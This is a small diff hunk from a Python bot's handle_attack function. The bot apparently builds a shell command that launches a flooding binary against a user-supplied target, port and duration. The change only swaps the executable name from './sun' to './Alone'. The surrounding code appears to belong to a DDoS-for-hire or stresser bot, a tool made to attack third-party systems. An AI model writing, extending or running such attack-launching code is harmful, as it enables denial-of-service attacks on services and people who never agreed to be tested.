@@ -198,7 +198,7 @@ def handle_attack(message):
     save_users()
 
     # Crafting the attack command
-    full_command = f"./sun {target} {port} {time_duration} 900"
+    full_command = f"./Alone {target} {port} {time_duration} 900"
 
     # Attempting to run the attack
     try:
